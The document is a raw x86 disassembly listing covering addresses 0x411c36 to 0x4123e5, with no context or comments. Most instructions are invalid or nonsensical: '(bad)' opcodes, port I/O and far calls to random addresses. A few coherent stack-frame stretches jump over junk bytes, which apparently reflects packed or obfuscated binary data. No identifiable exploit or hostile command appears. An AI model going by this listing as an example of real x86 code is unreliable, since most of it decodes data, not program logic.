  411c36:	mov    edi,0x20144088
  411c3b:	xor    esi,DWORD PTR [ecx+ebx*2]
  411c3e:	popf   
  411c3f:	pushf  
  411c40:	jle    0x411c5e
  411c42:	or     edi,ebx
  411c44:	mov    ecx,0x1aff1da0
  411c49:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  411c4b:	repnz lods al,BYTE PTR ds:[esi]
  411c4d:	push   ecx
  411c4e:	ret    
  411c4f:	mov    bl,BYTE PTR [ecx+0x46]
  411c52:	mov    es,WORD PTR [eax+esi*4]
  411c55:	pushf  
  411c56:	fnstcw WORD PTR [eax]
  411c58:	shr    DWORD PTR [esi+0x57d57c5d],0xf1
  411c5f:	pop    ecx
  411c60:	cdq    
  411c61:	sub    dl,ch
  411c63:	jmp    0x411cd6
  411c65:	sub    al,0xec
  411c67:	jge    0x411c43
  411c69:	stc    
  411c6a:	cs into 
  411c6c:	in     eax,dx
  411c6d:	aam    0x43
  411c6f:	int3   
  411c70:	adc    esi,0xffffffa6
  411c73:	push   ebp
  411c74:	ret    
  411c75:	shl    DWORD PTR [ebx],0x7a
  411c78:	(bad)  
  411c79:	cwde   
  411c7a:	push   cs
  411c7b:	xchg   ebp,eax
  411c7c:	xor    BYTE PTR [ebx+0xd7b35f0],cl
  411c82:	sbb    BYTE PTR [edx],bh
  411c84:	jo     0x411c88
  411c86:	jecxz  0x411c46
  411c88:	and    ebp,DWORD PTR [eax+0x63]
  411c8b:	gs dec eax
  411c8d:	aad    0xa
  411c8f:	shl    BYTE PTR [ecx-0x63e50e35],0xe3
  411c96:	add    al,0x31
  411c98:	lods   al,BYTE PTR ds:[esi]
  411c99:	jmp    0x3afd:0x5a32539
  411ca0:	into   
  411ca1:	mov    al,ds:0xad9df3ba
  411ca6:	adc    BYTE PTR [ecx-0x41825ef],ah
  411cac:	add    eax,DWORD PTR [edi]
  411cae:	or     edi,DWORD PTR [eax+0x6d151e01]
  411cb4:	jbe    0x411d1b
  411cb6:	repz ss aas 
  411cb9:	or     ah,BYTE PTR [edx-0x38b9c85f]
  411cbf:	imul   ecx,DWORD PTR [edi-0x31f789f7],0xf330e004
  411cc9:	add    ebp,DWORD PTR [edi]
  411ccb:	sahf   
  411ccc:	fmul   QWORD PTR [edi]
  411cce:	stos   DWORD PTR es:[edi],eax
  411ccf:	addr16 mov al,ds:0xdb07
  411cd3:	push   cs
  411cd4:	std    
  411cd5:	(bad)
  411cd8:	mov    edi,DWORD PTR [ebp-0x8]
  411cdb:	mov    ebx,DWORD PTR [ebp-0x10]
  411cde:	sub    ebx,edi
  411ce0:	cmp    ebx,edx
  411ce2:	mov    edx,DWORD PTR [ebp-0x38]
  411ce5:	jbe    0x411f76
  411ceb:	jmp    0x411f73
  411cf0:	rol    al,1
  411cf2:	(bad)  
  411cf3:	ds (bad) 
  411cf5:	into   
  411cf6:	rcl    dh,1
  411cf8:	adc    eax,0x7d66579e
  411cfd:	enter  0x3c1,0x7e
  411d01:	gs js  0x411d7c
  411d04:	in     eax,0x7e
  411d06:	js     0x411d80
  411d08:	xchg   ecx,eax
  411d09:	daa    
  411d0a:	pop    esp
  411d0b:	ror    BYTE PTR [ebp+0x5c6bc3ea],cl
  411d11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d12:	cmp    dl,ah
  411d14:	pop    edx
  411d15:	lahf   
  411d16:	add    al,0xa7
  411d18:	imul   ecx,DWORD PTR [edi-0x52],0xffffff83
  411d1c:	pop    ss
  411d1d:	jbe    0x411cc5
  411d1f:	cld    
  411d20:	das    
  411d21:	fst    DWORD PTR [ecx]
  411d23:	mov    BYTE PTR [ebp-0x59],dl
  411d26:	pushf  
  411d27:	mov    WORD PTR [ebx-0x32],?
  411d2a:	mov    bl,0x39
  411d2c:	in     al,dx
  411d2d:	sti    
  411d2e:	xchg   esi,eax
  411d2f:	jl     0x411cf6
  411d31:	mov    al,0x49
  411d33:	sbb    al,0x5f
  411d35:	sar    BYTE PTR [ecx-0x7],1
  411d38:	jecxz  0x411d5e
  411d3a:	repz div BYTE PTR [esi+0x5e90a7b9]
  411d41:	push   eax
  411d42:	(bad)  
  411d43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d44:	aaa    
  411d45:	(bad)  
  411d46:	es pop es
  411d48:	(bad)  
  411d49:	sbb    eax,0x5dca55de
  411d4e:	mov    esp,DWORD PTR [esi+0x34]
  411d51:	jg     0x411d8f
  411d53:	pop    ss
  411d54:	add    edi,ecx
  411d56:	lea    esp,[edi+eiz*1]
  411d59:	xchg   edi,eax
  411d5a:	xchg   ecx,eax
  411d5b:	(bad)  
  411d5c:	icebp  
  411d5d:	pop    ecx
  411d5e:	es (bad) 
  411d60:	xchg   edx,eax
  411d61:	ins    BYTE PTR es:[edi],dx
  411d62:	adc    al,0x35
  411d64:	and    BYTE PTR [eax-0x24],al
  411d67:	mov    edx,0x406c108f
  411d6c:	push   ebp
  411d6d:	adc    BYTE PTR [esi+0x7],bl
  411d70:	xchg   esi,eax
  411d71:	popf   
  411d72:	ins    BYTE PTR es:[edi],dx
  411d73:	cdq    
  411d74:	push   edi
  411d75:	stos   DWORD PTR es:[edi],eax
  411d76:	test   al,0x27
  411d78:	loopne 0x411dbf
  411d7a:	in     eax,0x4a
  411d7c:	loop   0x411d0d
  411d7e:	push   esp
  411d7f:	fld    DWORD PTR [edx-0x44]
  411d82:	mov    ecx,edi
  411d84:	fldcw  WORD PTR [eax-0x306a2c5d]
  411d8a:	dec    DWORD PTR [edx+0x5c84e85d]
  411d90:	xchg   DWORD PTR [edi-0x72],ebx
  411d93:	ja     0x411e03
  411d95:	sbb    DWORD PTR [ebx+0x47],ebx
  411d98:	pop    esi
  411d99:	dec    DWORD PTR [ebx]
  411d9b:	mov    bh,0x7e
  411d9d:	or     DWORD PTR [eax-0x22faba01],ecx
  411da3:	jmp    0xfd6ec903
  411da8:	push   edx
  411da9:	mov    ds,esi
  411dab:	push   ebp
  411dac:	jl     0x411dc8
  411dae:	les    ecx,FWORD PTR [ebx]
  411db0:	imul   ecx,DWORD PTR [esi],0x46
  411db3:	sub    bh,bl
  411db5:	cli    
  411db6:	call   0x8576:0xb0e79c9
  411dbd:	ja     0x411d53
  411dbf:	xor    ch,BYTE PTR [esi+0x56]
  411dc2:	fild   WORD PTR [ecx]
  411dc4:	fcomp  st(0)
  411dc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411dc7:	xchg   esi,eax
  411dc8:	(bad)  
  411dc9:	jge    0x411dd6
  411dcb:	out    0x6c,eax
  411dcd:	mov    ds:0x3740c311,al
  411dd2:	xchg   edi,eax
  411dd3:	inc    esp
  411dd4:	jle    0x411e2d
  411dd6:	call   0x805a7fee
  411ddb:	inc    esp
  411ddc:	das    
  411ddd:	dec    edx
  411dde:	test   BYTE PTR [esi+esi*1+0x6dd0ad3f],bh
  411de5:	rcl    DWORD PTR [ecx+0x325e4c97],cl
  411deb:	test   DWORD PTR ds:0xceb3a59e,0xbb86dc32
  411df5:	jmp    0x411dbc
  411df7:	not    BYTE PTR [ebx+edi*4]
  411dfa:	rcr    BYTE PTR [eax-0x61],0xd
  411dfe:	or     esp,ebx
  411e00:	test   eax,0xbc5e424
  411e05:	in     al,dx
  411e06:	imul   ebx,edi,0xd
  411e09:	pop    edx
  411e0a:	mov    WORD PTR [ebx-0x346a9ef9],ss
  411e10:	cwde   
  411e11:	daa    
  411e12:	mov    ch,ch
  411e14:	test   DWORD PTR [edi],eax
  411e16:	cmp    DWORD PTR [esi-0x70ca45b2],ecx
  411e1c:	icebp  
  411e1d:	daa    
  411e1e:	es test al,0xbb
  411e21:	or     al,0xb9
  411e23:	sub    eax,0x12e6ff3
  411e28:	test   dh,dh
  411e2a:	popf   
  411e2b:	mov    DWORD PTR [edi+0x790245fd],esi
  411e31:	push   cs
  411e32:	mov    bh,0x9f
  411e34:	test   edi,edi
  411e36:	pop    eax
  411e37:	outs   dx,DWORD PTR ds:[esi]
  411e38:	fs mov bh,0x3
  411e3b:	adc    edx,ecx
  411e3d:	pop    ds
  411e3e:	xor    DWORD PTR [ebx],0x3743f479
  411e44:	shl    DWORD PTR [esi],cl
  411e46:	xor    eax,0x4aa84cee
  411e4b:	pop    ebx
  411e4c:	call   0x1c3ad79
  411e51:	pop    eax
  411e52:	aam    0x52
  411e54:	and    edx,edi
  411e56:	mul    BYTE PTR [ebx-0x55]
  411e59:	dec    edx
  411e5a:	loop   0x411e52
  411e5c:	jp     0x411ec2
  411e5e:	retf   0x1901
  411e61:	adc    al,0xee
  411e63:	rcl    BYTE PTR [esi+0x1752e438],1
  411e69:	pop    es
  411e6a:	push   0x6a5cc1b
  411e6f:	xlat   BYTE PTR ds:[ebx]
  411e70:	add    ebp,DWORD PTR [edx-0x1539965b]
  411e76:	sti    
  411e77:	or     DWORD PTR fs:[edi+ebp*4],ebx
  411e7b:	mov    ebx,0x1b89bc9b
  411e80:	xor    eax,0xe7d07d02
  411e85:	(bad)  
  411e86:	jle    0x411ea8
  411e88:	mov    eax,0x97994549
  411e8d:	dec    edx
  411e8e:	xor    eax,0xaa6431a2
  411e93:	ins    DWORD PTR es:[edi],dx
  411e94:	adc    al,0xbe
  411e96:	(bad)  
  411e97:	lahf   
  411e98:	pop    ebx
  411e99:	cmp    eax,0xcf2276eb
  411e9e:	inc    esp
  411e9f:	jge    0x411eed
  411ea1:	fld    DWORD PTR [esi+edi*8]
  411ea4:	rcl    DWORD PTR [esi-0x20f69d08],cl
  411eaa:	fstp   QWORD PTR [eax-0x4b]
  411ead:	push   esp
  411eae:	stos   DWORD PTR es:[edi],eax
  411eaf:	stos   DWORD PTR es:[edi],eax
  411eb0:	xor    BYTE PTR [ecx+0x211c6e24],dl
  411eb6:	push   esi
  411eb7:	leave  
  411eb8:	or     eax,DWORD PTR [edx+ecx*1+0x22ecf5bd]
  411ebf:	fmul   st(5),st
  411ec1:	lods   eax,DWORD PTR ds:[esi]
  411ec2:	rcl    ebp,1
  411ec4:	repz push cs
  411ec6:	shl    DWORD PTR [edi],0x19
  411ec9:	das    
  411eca:	hlt    
  411ecb:	sbb    ebx,DWORD PTR [edx-0x6b790913]
  411ed1:	push   eax
  411ed2:	mov    edx,0x45789fad
  411ed7:	push   ecx
  411ed8:	sub    BYTE PTR [ecx+0x9f88f57],ch
  411ede:	add    BYTE PTR [ebx+0x6a],bh
  411ee1:	jge    0x411f14
  411ee3:	call   0x5d6b:0xede03da5
  411eea:	mov    ss,WORD PTR [eax+edx*8]
  411eed:	push   0xffffff95
  411eef:	cdq    
  411ef0:	inc    edx
  411ef1:	in     al,dx
  411ef2:	jmp    0x411e7d
  411ef4:	ror    DWORD PTR [esi-0x51],cl
  411ef7:	sbb    BYTE PTR [eax-0x1e],dl
  411efa:	mov    al,cl
  411efc:	int    0x43
  411efe:	push   eax
  411eff:	or     eax,0xc2391231
  411f04:	add    al,0x14
  411f06:	inc    edi
  411f07:	fld    QWORD PTR [edi-0x70]
  411f0a:	and    ecx,DWORD PTR [eax-0x65bb303c]
  411f10:	push   ds
  411f11:	sbb    BYTE PTR [esi+0x13],al
  411f14:	dec    ebp
  411f15:	add    edi,esp
  411f17:	sti    
  411f18:	ins    DWORD PTR es:[edi],dx
  411f19:	ds jmp 0xe1c2529c
  411f1f:	ss call 0x13c6e791
  411f25:	in     eax,0x3
  411f27:	mov    dl,0xbe
  411f29:	sbb    ecx,ecx
  411f2b:	shr    bh,1
  411f2d:	dec    edx
  411f2e:	loop   0x411f74
  411f30:	mov    esp,0x2388cc74
  411f35:	jmp    0x411ece
  411f37:	ins    DWORD PTR es:[edi],dx
  411f38:	xchg   esi,edx
  411f3a:	pop    ecx
  411f3b:	jmp    0x8d05fae
  411f40:	call   0xb7aeda64
  411f45:	mov    ebp,0xdfaa3de3
  411f4a:	mov    eax,ds:0xc6808d6e
  411f4f:	ds clc 
  411f51:	(bad)  
  411f52:	mov    edx,0x60d39ac9
  411f57:	cwde   
  411f58:	sbb    ch,cl
  411f5a:	in     al,0xab
  411f5c:	dec    esi
  411f5d:	fdivr  DWORD PTR [esp+esi*1]
  411f60:	popa   
  411f61:	cli    
  411f62:	sbb    DWORD PTR [ebx+0x391c9eed],ecx
  411f68:	shl    BYTE PTR [ecx+0x6c],0xcf
  411f6c:	ins    BYTE PTR es:[edi],dx
  411f6d:	jno    0x411f43
  411f6f:	fwait
  411f70:	cmp    BYTE PTR [edi-0x3baa74c3],al
  411f76:	mov    edi,DWORD PTR [ebp-0x4]
  411f79:	xor    edi,eax
  411f7b:	xor    edx,eax
  411f7d:	jmp    0x412205
  411f82:	rol    dl,1
  411f84:	enter  0xdac3,0xd1
  411f88:	fcmovnu st,st(1)
  411f8a:	xchg   ebp,eax
  411f8b:	add    al,0x8c
  411f8d:	inc    edi
  411f8e:	(bad)  
  411f8f:	xor    dl,BYTE PTR [ebp+edi*8+0x78786beb]
  411f96:	in     eax,0x7e
  411f98:	js     0x412012
  411f9a:	popa   
  411f9b:	loop   0x411f76
  411f9d:	xchg   BYTE PTR [esi-0x79],al
  411fa0:	or     eax,0x293e9894
  411fa5:	add    esp,ecx
  411fa7:	inc    edx
  411fa8:	mov    ebp,0x684476f1
  411fad:	bound  esp,QWORD PTR [edx+0x3f983411]
  411fb3:	add    eax,0x1e6438c
  411fb8:	repz xor al,0x30
  411fbb:	loope  0x411f4e
  411fbd:	icebp  
  411fbe:	sbb    al,BYTE PTR [esi-0xd]
  411fc1:	test   cl,ch
  411fc3:	lods   eax,DWORD PTR ds:[esi]
  411fc4:	xchg   ecx,eax
  411fc5:	push   ds
  411fc6:	stc    
  411fc7:	push   ebp
  411fc8:	adc    al,0xd4
  411fca:	push   edx
  411fcb:	arpl   WORD PTR [ebp-0x20fa93a4],cx
  411fd1:	push   ds
  411fd2:	and    al,0x5b
  411fd4:	jno    0x411fcc
  411fd6:	mov    ecx,0xbd92196a
  411fdb:	add    BYTE PTR [ecx],0xcc
  411fde:	repz call 0x371b:0xbda6ba82
  411fe6:	dec    esp
  411fe7:	mov    ah,0xa2
  411fe9:	fst    DWORD PTR [esi]
  411feb:	inc    esi
  411fec:	data16 (bad) 
  411fee:	repnz lea ebx,[eax+0x4e138d7c]
  411ff5:	test   eax,0x9c27605c
  411ffa:	fistp  WORD PTR [esi-0x6c]
  411ffd:	xlat   BYTE PTR ds:[ebx]
  411ffe:	popf   
  411fff:	cdq    
  412000:	adc    ebp,ebp
  412002:	pop    ss
  412003:	pop    eax
  412004:	mov    edx,0xf8c81c2b
  412009:	mov    ch,0x9c
  41200b:	fdivr  DWORD PTR [ebp-0x15]
  41200e:	mov    esi,DWORD PTR [ebp-0xd70d7cb]
  412014:	mov    bl,0x25
  412016:	mov    ch,ah
  412018:	ret    0x5147
  41201b:	das    
  41201c:	leave  
  41201d:	xchg   esp,eax
  41201e:	jp     0x411fe7
  412020:	lea    ebx,[edx+0x22]
  412023:	daa    
  412024:	fstp   TBYTE PTR [esi]
  412026:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412027:	test   eax,0xddc4ee7d
  41202c:	mov    ebx,0xee418d60
  412031:	or     BYTE PTR [edi-0x7b],0x2d
  412035:	aas    
  412036:	and    cl,bl
  412038:	rol    BYTE PTR [eax],0x40
  41203b:	out    dx,al
  41203c:	pop    edi
  41203d:	jmp    0x35a909f4
  412042:	sub    bl,ch
  412044:	out    dx,al
  412045:	mov    bh,0xad
  412047:	mov    edx,DWORD PTR [ebx+0x20]
  41204a:	sbb    DWORD PTR [ecx],esp
  41204c:	inc    ebp
  41204d:	fxtract 
  41204f:	jb     0x41206b
  412051:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412052:	es pop eax
  412054:	mov    ebp,0xffc79919
  412059:	add    DWORD PTR [edi-0x360906c4],ecx
  41205f:	fs out dx,eax
  412061:	pop    es
  412062:	pop    ecx
  412063:	xchg   ebp,eax
  412064:	test   BYTE PTR [ebx+ecx*8],al
  412067:	addr16 inc esi
  412069:	dec    ebp
  41206a:	in     al,dx
  41206b:	adc    BYTE PTR [ebp+0x51],0xaf
  41206f:	sub    al,BYTE PTR [edx]
  412071:	inc    esi
  412072:	int    0xc4
  412074:	push   0x86082e11
  412079:	outs   dx,BYTE PTR ds:[esi]
  41207a:	xchg   dh,dh
  41207c:	imul   edx,edx,0x8
  41207f:	sbb    BYTE PTR [eax],0xb8
  412082:	mov    dl,0x25
  412084:	pop    ss
  412085:	xlat   BYTE PTR ds:[ebx]
  412086:	sti    
  412087:	push   ds
  412088:	stc    
  412089:	cmc    
  41208a:	sub    al,BYTE PTR [ebx]
  41208c:	into   
  41208d:	xor    dl,BYTE PTR [edi]
  41208f:	jo     0x4120ac
  412091:	loope  0x4120a0
  412093:	adc    bl,BYTE PTR [edi]
  412095:	ror    DWORD PTR [edx+eiz*1],1
  412098:	sahf   
  412099:	xchg   edx,eax
  41209a:	ja     0x41210b
  41209c:	pop    eax
  41209d:	lock sbb al,BYTE PTR ds:0x2f07ec87
  4120a4:	sbb    al,0x2c
  4120a6:	sub    ebx,DWORD PTR [eax-0x45]
  4120a9:	inc    edi
  4120aa:	inc    eax
  4120ab:	cwde   
  4120ac:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4120ae:	fst    DWORD PTR [ebp+0x12fd3211]
  4120b4:	sub    edi,0x75b4502
  4120ba:	imul   ebp,eax,0xffffffa9
  4120bd:	call   0x9c99:0xd4cadc47
  4120c4:	push   ebp
  4120c5:	push   esp
  4120c6:	fbld   TBYTE PTR [ecx]
  4120c8:	scas   eax,DWORD PTR es:[edi]
  4120c9:	pop    ebp
  4120ca:	jl     0x41213f
  4120cc:	pushf  
  4120cd:	out    0x7f,eax
  4120cf:	add    al,0xff
  4120d1:	stc    
  4120d2:	pop    ebp
  4120d3:	(bad)  
  4120d4:	ja     0x412107
  4120d6:	push   ebp
  4120d7:	cdq    
  4120d8:	and    edx,DWORD PTR [edi-0x61]
  4120db:	std    
  4120dc:	ja     0x412136
  4120de:	out    0x2,eax
  4120e0:	mov    ds:0x8cd80ca5,eax
  4120e5:	out    dx,al
  4120e6:	sbb    edx,DWORD PTR [edx]
  4120e8:	jae    0x412108
  4120ea:	fcomip st,st(7)
  4120ec:	int3   
  4120ed:	and    esp,ebp
  4120ef:	fsubr  st,st(5)
  4120f1:	js     0x412078
  4120f3:	push   ds
  4120f4:	mov    ds:0x57e5eb17,al
  4120f9:	mov    ebp,0x6ad19b21
  4120fe:	out    dx,eax
  4120ff:	aad    0x44
  412101:	sahf   
  412102:	pop    es
  412103:	stos   DWORD PTR es:[edi],eax
  412104:	das    
  412105:	popa   
  412106:	or     eax,0x26f60546
  41210b:	mov    WORD PTR [eax+edx*4],ss
  41210e:	inc    esi
  41210f:	mov    DWORD PTR [eax+0x7d],esp
  412112:	jae    0x412115
  412114:	int    0x18
  412116:	inc    esi
  412117:	dec    esp
  412118:	ror    DWORD PTR [esi-0x2582ad18],1
  41211e:	mov    WORD PTR [ebp+0x2e],ss
  412121:	cmp    al,0x4c
  412123:	xor    DWORD PTR [ebx+0x25],esi
  412126:	call   0x86b63325
  41212b:	ds jo  0x4120c6
  41212e:	cli    
  41212f:	pop    ebp
  412130:	shld   DWORD PTR [ebx+0x56],esi,cl
  412134:	pop    ds
  412135:	test   DWORD PTR [edx-0x5a7089c0],esp
  41213b:	sbb    DWORD PTR [edx],edx
  41213d:	lods   al,BYTE PTR ds:[esi]
  41213e:	leave  
  41213f:	jecxz  0x412111
  412141:	aaa    
  412142:	or     dh,bh
  412144:	cwde   
  412145:	pop    esp
  412146:	or     BYTE PTR [eax-0x5229fae0],0xc4
  41214d:	push   esi
  41214e:	pop    esi
  41214f:	ret    0x4b7e
  412152:	sbb    al,0xf7
  412154:	cs sub eax,0x90bc288c
  41215a:	cs aas 
  41215c:	push   ebx
  41215d:	mov    esi,0xf139aa1b
  412163:	stos   BYTE PTR es:[edi],al
  412164:	arpl   WORD PTR [ecx],cx
  412166:	mov    ecx,0x997fb18f
  41216b:	shl    DWORD PTR ds:0xdf1f3934,cl
  412171:	xchg   edi,eax
  412172:	loop   0x412169
  412174:	clc    
  412175:	lock push ebx
  412177:	loope  0x412188
  412179:	aam    0xd5
  41217b:	lea    esi,[ebx-0x73]
  41217e:	test   bh,dl
  412180:	loopne 0x4121a5
  412182:	std    
  412183:	pop    ebp
  412184:	xlat   BYTE PTR ds:[ebx]
  412185:	jne    0x41216d
  412187:	pop    ss
  412188:	test   eax,0xfecf4079
  41218d:	dec    ebx
  41218e:	xchg   edi,eax
  41218f:	pop    DWORD PTR [esi-0xafe90a8]
  412195:	je     0x412192
  412197:	out    dx,eax
  412198:	test   DWORD PTR [edx+ecx*1],esi
  41219b:	and    eax,0xb00f2c49
  4121a0:	mov    ds:0x8b72555,eax
  4121a5:	add    al,0xd4
  4121a7:	stos   BYTE PTR es:[edi],al
  4121a8:	mov    bl,0x9f
  4121aa:	inc    esi
  4121ab:	mov    esi,DWORD PTR [esi+0x9]
  4121ae:	mov    dh,0xcb
  4121b0:	lock into 
  4121b2:	(bad)  
  4121b3:	out    dx,al
  4121b4:	stos   BYTE PTR es:[di],al
  4121b6:	push   es
  4121b7:	call   0x846a81a3
  4121bc:	pop    ds
  4121bd:	sbb    DWORD PTR [ebp-0x7ac30a4b],ebx
  4121c3:	(bad)  
  4121c4:	inc    esi
  4121c5:	add    BYTE PTR [eax],dl
  4121c7:	sahf   
  4121c8:	push   es
  4121c9:	in     eax,0x7f
  4121cb:	out    0x35,eax
  4121cd:	loope  0x41223e
  4121cf:	daa    
  4121d0:	sbb    dh,BYTE PTR [edx]
  4121d2:	mov    edi,DWORD PTR [edi+0x3f8c726d]
  4121d8:	popa   
  4121d9:	les    ebp,FWORD PTR ds:0x984365b5
  4121df:	pop    eax
  4121e0:	mov    eax,ds:0xa8f3be46
  4121e5:	addr16 cs leave 
  4121e8:	cmc    
  4121e9:	das    
  4121ea:	mov    al,0xfa
  4121ec:	cs and al,0x36
  4121ef:	or     esp,DWORD PTR gs:[edi+esi*2-0x80]
  4121f4:	sar    ecx,cl
  4121f6:	cmp    ecx,DWORD PTR [esi-0x66]
  4121f9:	rcr    DWORD PTR [ebp-0x57],cl
  4121fc:	out    0xb4,al
  4121fe:	inc    eax
  4121ff:	test   eax,0xb06cec7a
  412204:	lahf   
  412205:	add    edi,ecx
  412207:	add    edx,ecx
  412209:	imul   edx,edi
  41220c:	mov    DWORD PTR [ebp+0xc],edx
  41220f:	mov    edx,DWORD PTR [ebp+0xc]
  412212:	mov    DWORD PTR [ebp-0x24],edx
  412215:	mov    edx,DWORD PTR [ebp-0x8]
  412218:	add    edx,DWORD PTR [ebp-0x40]
  41221b:	mov    DWORD PTR [ebp-0x18],0xf89c8538
  412222:	jmp    0x4124aa
  412227:	(bad)
  41222b:	(bad)  
  41222c:	fcmovnu st,st(1)
  41222e:	shr    esp,1
  412230:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412231:	xchg   edx,eax
  412232:	(bad)  
  412233:	mov    edi,0x50a53c1e
  412238:	imul   edi,DWORD PTR [eax+0x78],0x78787ee5
  41223f:	xlat   BYTE PTR ds:[ebx]
  412240:	scas   eax,DWORD PTR es:[edi]
  412241:	sti    
  412242:	push   ds
  412243:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412244:	xor    edi,0x71ea2774
  41224a:	out    dx,al
  41224b:	mov    edi,0x585595a0
  412250:	lds    ecx,FWORD PTR [ebp-0x22]
  412253:	in     eax,dx
  412254:	nop
  412255:	sahf   
  412256:	and    dl,BYTE PTR ds:[ebp-0xb337c10]
  41225d:	rcl    BYTE PTR [esi],cl
  41225f:	jecxz  0x412273
  412261:	and    DWORD PTR [ecx],eax
  412263:	lds    esi,FWORD PTR [eax-0x5c]
  412266:	sub    dh,BYTE PTR [edi]
  412268:	dec    ecx
  412269:	xlat   BYTE PTR ds:[ebx]
  41226a:	push   edi
  41226b:	jo     0x412207
  41226d:	xchg   edx,eax
  41226e:	adc    bl,0xca
  412271:	fs shr bl,1
  412274:	ss std 
  412276:	fdiv   DWORD PTR [edx+edx*8-0x3e6a8d50]
  41227d:	sbb    al,0xd5
  41227f:	mov    ah,0x40
  412281:	ja     0x412275
  412283:	push   es
  412284:	sahf   
  412285:	sub    edx,eax
  412287:	or     dh,BYTE PTR [ecx]
  412289:	jb     0x412299
  41228b:	cwde   
  41228c:	bound  esi,QWORD PTR [ebx+0x30]
  41228f:	mov    ds:0xb888da27,eax
  412294:	pop    ss
  412295:	push   ds
  412296:	xchg   edx,eax
  412297:	mov    ds:0x2a70ac49,eax
  41229c:	or     esp,DWORD PTR [edx]
  41229e:	mov    ebp,0xe9e38c8a
  4122a3:	lods   al,BYTE PTR ds:[esi]
  4122a4:	enter  0xbcbf,0x3
  4122a8:	jns    0x41231e
  4122aa:	inc    edi
  4122ab:	cdq    
  4122ac:	jge    0x412319
  4122ae:	jnp    0x412314
  4122b0:	pop    ss
  4122b1:	mov    ds:0xba8744d8,al
  4122b6:	scas   eax,DWORD PTR es:[edi]
  4122b7:	adc    al,0x99
  4122b9:	jbe    0x412293
  4122bb:	aam    0xa6
  4122bd:	out    0x44,al
  4122bf:	adc    DWORD PTR [edx],edi
  4122c1:	ds icebp 
  4122c3:	(bad)  
  4122c4:	mov    al,0xb0
  4122c6:	xchg   esp,esi
  4122c8:	aaa    
  4122c9:	add    dl,BYTE PTR [ebp+0x3a2bde26]
  4122cf:	bnd jb 0x4122bb
  4122d2:	mov    DWORD PTR [ebx+0x4934686],esp
  4122d8:	lds    eax,FWORD PTR [ecx]
  4122da:	ins    DWORD PTR es:[edi],dx
  4122db:	inc    edi
  4122dc:	and    al,0x45
  4122de:	mov    bh,0x9b
  4122e0:	popa   
  4122e1:	cld    
  4122e2:	add    al,BYTE PTR [esi]
  4122e4:	mov    dh,0xf2
  4122e6:	adc    al,0x83
  4122e8:	mov    ecx,0xca92e28b
  4122ed:	lods   al,BYTE PTR ds:[esi]
  4122ee:	stos   BYTE PTR es:[edi],al
  4122ef:	xchg   ebx,eax
  4122f0:	clc    
  4122f1:	sbb    DWORD PTR [edx+0x609f623d],ebx
  4122f7:	mov    DWORD PTR [edx],ebx
  4122f9:	push   ecx
  4122fa:	les    esp,FWORD PTR [edx-0x66]
  4122fd:	add    al,0x9a
  4122ff:	cld    
  412300:	scas   al,BYTE PTR es:[edi]
  412301:	push   esp
  412302:	push   ebx
  412303:	icebp  
  412304:	jno    0x412309
  412306:	retf   
  412307:	sub    DWORD PTR [edi],edi
  412309:	test   DWORD PTR [edi],ecx
  41230b:	loopne 0x41229f
  41230d:	jg     0x4122f0
  41230f:	idiv   eax
  412311:	mov    ecx,0xaa1a25d2
  412316:	mov    edx,DWORD PTR [ecx+0x5bfda840]
  41231c:	mov    ds:0x455828fe,al
  412321:	fist   DWORD PTR [edx+0x631286c7]
  412328:	jb     0x4122c8
  41232a:	adc    al,0x45
  41232c:	xor    eax,DWORD PTR [edx]
  41232e:	push   cs
  41232f:	pop    esp
  412330:	stc    
  412331:	push   ebp
  412332:	add    DWORD PTR ds:0x4f90bc40,ebp
  412338:	pusha  
  412339:	add    DWORD PTR ds:0x5c827e40,edx
  41233f:	inc    ebp
  412340:	enter  0xaa7a,0x7
  412344:	rcr    ebp,1
  412346:	call   0xf0be:0xda66154f
  41234d:	aad    0xa
  41234f:	lea    eax,[ecx-0x64]
  412352:	stos   DWORD PTR es:[edi],eax
  412353:	cmp    BYTE PTR [ebx-0x636365e3],dl
  412359:	jle    0x4122ea
  41235b:	pop    esi
  41235c:	inc    eax
  41235d:	xchg   DWORD PTR [edx+edx*1-0x1e],edi
  412361:	into   
  412362:	ror    BYTE PTR [eax],cl
  412364:	cli    
  412365:	test   DWORD PTR [esi+esi*1],eax
  412368:	scas   eax,DWORD PTR es:[edi]
  412369:	cli    
  41236a:	out    dx,eax
  41236b:	ins    BYTE PTR es:[edi],dx
  41236c:	pop    ebp
  41236d:	scas   eax,DWORD PTR es:[edi]
  41236e:	adc    esp,edi
  412370:	loop   0x4123bb
  412372:	xlat   BYTE PTR ds:[bx]
  412374:	push   0x36
  412376:	xor    DWORD PTR [ebx+0x76a1ffff],edx
  41237c:	sub    al,0x7d
  41237e:	inc    esi
  41237f:	and    eax,0xd145b5b6
  412384:	lahf   
  412385:	mov    ecx,0xf6198282
  41238a:	ins    BYTE PTR es:[edi],dx
  41238b:	adc    eax,0x449c8f2c
  412390:	outs   dx,DWORD PTR ds:[esi]
  412391:	pop    ecx
  412392:	sbb    ebx,DWORD PTR [edx-0x3e910678]
  412398:	mov    edi,0x3b216a42
  41239d:	aam    0xa4
  41239f:	sar    BYTE PTR [eax+0x48b7a307],cl
  4123a5:	push   edx
  4123a6:	sbb    edx,DWORD PTR [eax-0x4e15a854]
  4123ac:	(bad)  
  4123ad:	and    DWORD PTR [ebp-0x17],eax
  4123b0:	call   0xdc1bd442
  4123b5:	fsub   st,st(4)
  4123b7:	sbb    al,0x99
  4123b9:	cli    
  4123ba:	inc    edi
  4123bb:	mov    dl,0xac
  4123bd:	xchg   edi,eax
  4123be:	pop    DWORD PTR [esi-0x183b583a]
  4123c4:	pop    ebx
  4123c5:	mov    dl,0xfe
  4123c7:	add    eax,0xf2f9ce98
  4123cc:	jbe    0x41242d
  4123ce:	in     al,dx
  4123cf:	jl     0x4123a4
  4123d1:	mov    cl,0x6a
  4123d3:	fbld   TBYTE PTR [ebp+eiz*2-0x17570ade]
  4123da:	jle    0x412406
  4123dc:	call   0xec61:0x2bf0efb5
  4123e3:	cli    
  4123e4:	pop    ss
  4123e5:	adc    BYTE PTR [ebp-0x39557963],al
